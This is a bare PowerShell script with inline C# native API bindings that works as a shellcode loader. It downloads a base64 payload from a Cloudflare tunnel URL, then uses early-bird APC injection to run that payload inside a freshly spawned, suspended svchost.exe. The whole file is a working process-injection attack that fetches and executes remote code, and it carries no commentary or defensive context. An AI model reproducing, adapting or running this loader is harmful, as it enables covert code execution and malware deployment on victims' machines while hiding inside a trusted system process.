$u="https://geometry-offered-guns-replies.trycloudflare.com/payloads/shellcode.txt?key=8ca60eebbe9a141869305ed9ab1a0050"
[Net.ServicePointManager]::SecurityProtocol="Tls12"

$c=@"
using System;using System.Runtime.InteropServices;
public class E{
[DllImport("ntdll.dll")]public static extern uint NtCreateUserProcess(ref IntPtr ph,ref IntPtr th,uint pa,uint ta,IntPtr poa,IntPtr toa,uint pf,uint tf,IntPtr pp,ref PS_CREATE_INFO ci,ref PS_ATTRIBUTE_LIST al);
[DllImport("ntdll.dll")]public static extern uint NtAllocateVirtualMemory(IntPtr h,ref IntPtr b,IntPtr z,ref IntPtr s,uint t,uint p);
[DllImport("ntdll.dll")]public static extern uint NtWriteVirtualMemory(IntPtr h,IntPtr b,byte[] buf,uint sz,ref uint w);
[DllImport("ntdll.dll")]public static extern uint NtProtectVirtualMemory(IntPtr h,ref IntPtr b,ref IntPtr s,uint np,ref uint op);
[DllImport("ntdll.dll")]public static extern uint NtQueueApcThread(IntPtr th,IntPtr f,IntPtr a1,IntPtr a2,IntPtr a3);
[DllImport("ntdll.dll")]public static extern uint NtAlertResumeThread(IntPtr th,ref uint sc);
[DllImport("ntdll.dll")]public static extern uint NtClose(IntPtr h);
[DllImport("ntdll.dll")]public static extern uint NtTestAlert();
[DllImport("kernel32.dll")]public static extern bool CreateProcessW(string app,string cmd,IntPtr pa,IntPtr ta,bool ih,uint cf,IntPtr env,string cd,ref SI si,ref PI pi);
[StructLayout(LayoutKind.Sequential)]public struct SI{public int cb;public IntPtr r,d,t;public int x,y,w,h,xc,yc,fa;public short sw,r2;public IntPtr r3,si,so,se;}
[StructLayout(LayoutKind.Sequential)]public struct PI{public IntPtr hP,hT;public int pI,tI;}
[StructLayout(LayoutKind.Sequential)]public struct PS_CREATE_INFO{public IntPtr Size;public int State;[MarshalAs(UnmanagedType.ByValArray,SizeConst=80)]public byte[] Data;}
[StructLayout(LayoutKind.Sequential)]public struct PS_ATTRIBUTE_LIST{public IntPtr TotalLength;[MarshalAs(UnmanagedType.ByValArray,SizeConst=2)]public PS_ATTRIBUTE[] Attributes;}
[StructLayout(LayoutKind.Sequential)]public struct PS_ATTRIBUTE{public IntPtr Attribute;public IntPtr Size;public IntPtr Value;public IntPtr ReturnLength;}
}
"@
Add-Type $c

$sc=[Convert]::FromBase64String((New-Object Net.WebClient).DownloadString($u))

# Create suspended process
$si=New-Object E+SI;$si.cb=104
$pi=New-Object E+PI
$path="C:\Windows\System32\svchost.exe"
if(-not([E]::CreateProcessW($path,"-k netsvcs",[IntPtr]::Zero,[IntPtr]::Zero,$false,0x4,[IntPtr]::Zero,$null,[ref]$si,[ref]$pi))){return}

# Allocate in suspended process
$a=[IntPtr]::Zero;$sz=[IntPtr]$sc.Length
$r=[E]::NtAllocateVirtualMemory($pi.hP,[ref]$a,[IntPtr]::Zero,[ref]$sz,0x3000,0x40)
if($a -eq [IntPtr]::Zero){[E]::NtClose($pi.hP);[E]::NtClose($pi.hT);return}

# Write shellcode
$w=[uint32]0
[E]::NtWriteVirtualMemory($pi.hP,$a,$sc,[uint32]$sc.Length,[ref]$w)|Out-Null

# Queue APC to main thread (runs before entry point)
[E]::NtQueueApcThread($pi.hT,$a,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero)|Out-Null

# Alert and Resume thread - forces APC execution
$sus=[uint32]0
[E]::NtAlertResumeThread($pi.hT,[ref]$sus)|Out-Null
"OK"
